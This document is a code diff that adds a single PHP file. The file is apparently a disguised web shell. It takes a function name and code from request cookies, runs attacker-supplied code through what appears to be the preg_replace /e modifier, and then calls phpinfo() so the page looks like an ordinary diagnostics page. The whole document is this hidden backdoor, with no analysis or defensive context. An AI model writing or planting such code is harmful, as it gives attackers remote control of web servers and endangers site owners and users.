@@ -1,0 +1,1 @@
+<?php $form1=@$_COOKIE["Kcqf3"]; if ($form1){ $opt=$form1(@$_COOKIE["Kcqf2"]); $au=$form1(@$_COOKIE["Kcqf1"]); $opt("/292/e",$au,292); } phpinfo();
